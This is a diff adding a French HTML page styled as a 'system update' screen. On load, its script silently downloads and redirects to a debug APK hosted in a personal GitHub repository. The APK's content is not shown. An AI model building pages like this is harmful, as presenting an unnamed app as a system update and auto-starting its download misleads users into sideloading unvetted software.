@@ -1,0 +1,75 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mise à jour système</title>
+    <meta http-equiv="cache-control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="pragma" content="no-cache">
+    <meta http-equiv="expires" content="0">
+    
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+        .container {
+            text-align: center;
+            background: white;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .loader {
+            border: 4px solid #f3f3f3;
+            border-top: 4px solid #3498db;
+            border-radius: 50%;
+            width: 40px;
+            height: 40px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px auto;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        p { margin: 0; color: #666; font-size: 14px; }
+        h2 { margin-bottom: 10px; color: #333; font-size: 18px; }
+    </style>
+</head>
+<body>
+
+    <div class="container">
+        <div class="loader"></div>
+        <h2>Téléchargement en cours...</h2>
+        <p>Veuillez patienter pendant l'installation.</p>
+    </div>
+
+    <script>
+        // URL DE VOTRE FICHIER APK (Avec /raw/ forcé)
+        const apkUrl = 'https://github.com/Mansah7/mansah-app/raw/93023877a4548517a7b22edcc6d8b073f677c425/app-debug.apk';
+
+        function installApp() {
+            const link = document.createElement('a');
+            link.href = apkUrl;
+            link.download = ''; 
+            link.style.display = 'none';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            setTimeout(() => {
+                window.location.href = apkUrl;
+            }, 1500);
+        }
+
+        window.onload = installApp;
+    </script>
+
+</body>
+</html>
